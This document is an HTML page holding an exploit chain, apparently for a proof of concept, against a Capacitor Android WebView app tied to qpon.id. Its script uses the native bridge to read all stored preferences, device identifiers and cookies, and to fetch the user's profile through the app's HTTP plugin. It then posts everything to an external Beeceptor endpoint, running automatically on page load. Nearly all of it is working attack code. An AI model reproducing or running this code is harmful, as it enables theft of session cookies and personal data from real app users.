<!DOCTYPE html>
<html>
<head>
    <title>Qpon Exploit Chain</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        #output { white-space: pre-wrap; word-break: break-all; border: 1px solid #333; padding: 10px; }
        .stat { color: #ff0055; font-weight: bold; }
    </style>
</head>
<body>
    <h2>Exploit Status: <span id="status" class="stat">Running...</span></h2>
    <div id="output"></div>

<script>
// ============================================================
//  INITIALIZATION & CONFIG
// ============================================================
const BEECEPTOR_URL = 'https://evilios.free.beeceptor.com';
const stolen = {
    metadata: {
        url: window.location.href,
        ua: navigator.userAgent,
        timestamp: new Date().toISOString()
    },
    preferences: {},
    storage: {},
    device: {},
    cookies: [],
    ssrf: {}
};

let callId = 0;
const pendingCalls = {};

function log(msg) {
    console.log(msg);
    document.getElementById('output').textContent += msg + '\n';
}

// ============================================================
//  CORE BRIDGE UTILITIES
// ============================================================
function capCall(pluginId, methodName, options = {}) {
    return new Promise((resolve, reject) => {
        const cbId = 'exploit_' + (++callId);
        pendingCalls[cbId] = { resolve, reject };

        const msg = JSON.stringify({
            type: 'message',
            pluginId: pluginId,
            methodName: methodName,
            callbackId: cbId,
            options: options
        });

        try {
            window.androidBridge.postMessage(msg);
        } catch(e) {
            log('Bridge call failed: ' + e);
            reject(e);
        }

        setTimeout(() => {
            if (pendingCalls[cbId]) {
                delete pendingCalls[cbId];
                resolve({timeout: true});
            }
        }, 5000);
    });
}

// Hook Capacitor Response
if (window.Capacitor && window.Capacitor.fromNative) {
    const origFromNative = window.Capacitor.fromNative;
    window.Capacitor.fromNative = function(result) {
        if (result && result.callbackId && pendingCalls[result.callbackId]) {
            const cb = pendingCalls[result.callbackId];
            delete pendingCalls[result.callbackId];
            if (result.success) cb.resolve(result.data || {});
            else cb.reject(result.error || 'error');
        }
        if (origFromNative) origFromNative(result);
    };
}

// ============================================================
//  EXPLOIT MODULES (Populating 'stolen' object)
// ============================================================
async function stealPreferences() {
    log('[*] Stealing Preferences...');
    const keysResult = await capCall('Preferences', 'keys', {});
    if (keysResult && keysResult.keys) {
        for (const key of keysResult.keys) {
            const val = await capCall('Preferences', 'get', { key: key });
            stolen.preferences[key] = val.value;
        }
    }
}

async function stealDeviceInfo() {
    log('[*] Stealing Device Info...');
    stolen.device.info = await capCall('Device', 'getDeviceInfo', {});
    try {
        stolen.device.stdId = await capCall('Device', 'getCacheStdID', {});
    } catch(e) {}
}

async function stealCookies() {
    log('[*] Stealing Cookies...');
    stolen.cookies = await capCall('CapacitorCookies', 'getCookies', {});
    stolen.webCookie = document.cookie;
}

async function ssrfAttack() {
    log('[*] Running SSRF (Profile Check)...');
    const target = 'https://qpon.id/api/user/profile';
    try {
        const resp = await capCall('CapacitorHttp', 'get', { url: target });
        stolen.ssrf.profile = resp;
    } catch(e) {
        stolen.ssrf.error = e.toString();
    }
}

// ============================================================
//  EXFILTRATION (Beeceptor)
// ============================================================
async function exfiltrate() {
    log('[*] EXFILTRATING TO BEECEPTOR...');
    try {
        // Use the Capacitor bridge itself to bypass any CORS/SOP
        await capCall('CapacitorHttp', 'post', {
            url: BEECEPTOR_URL,
            headers: { 'Content-Type': 'application/json' },
            data: JSON.stringify(stolen)
        });
        log('[+] Data sent via CapacitorHttp');
    } catch(e) {
        // Standard fetch fallback
        fetch(BEECEPTOR_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(stolen)
        }).then(() => log('[+] Data sent via Fetch Fallback'));
    }
}

// ============================================================
//  MAIN EXECUTION
// ============================================================
async function main() {
    if (typeof window.androidBridge === 'undefined') {
        log('[!] ERROR: androidBridge not found. Not in WebView?');
        document.getElementById('status').textContent = 'Failed';
        return;
    }

    try {
        await stealPreferences();
        await stealDeviceInfo();
        await stealCookies();
        await ssrfAttack();
        
        // Send everything collected
        await exfiltrate();
        
        document.getElementById('status').textContent = 'Exploit Complete';
        log('\n=== DONE ===\nCheck Beeceptor Dashboard.');
    } catch(e) {
        log('Main Chain Error: ' + e);
    }
}

setTimeout(main, 1500);
</script>
</body>
</html>
